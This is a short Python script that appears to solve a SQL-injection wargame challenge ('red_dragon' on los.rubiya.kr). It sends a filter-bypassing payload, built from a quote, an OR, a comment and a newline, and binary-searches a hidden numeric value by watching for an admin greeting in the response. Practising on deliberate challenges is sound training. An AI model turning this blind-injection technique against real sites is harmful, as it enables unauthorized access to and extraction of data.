import urllib.request
import sys

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?"
cookie = sys.argv[1]
pw = ''

high = 10000000000
low = 0

while True:
  mid = (high + low) // 2
  if (mid == high) or (mid == low):
    break
  query = "id=%27||no<%23&no=%0a{}".format(mid)
  req = urllib.request.Request(
    url+query,
    data=None,
    headers={
      "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
      "Cookie" : cookie
    })
  with urllib.request.urlopen(req) as res:
    body = res.read().decode()
  if 'Hello admin' in body:
    high = mid
  else:
    low = mid
print(mid)
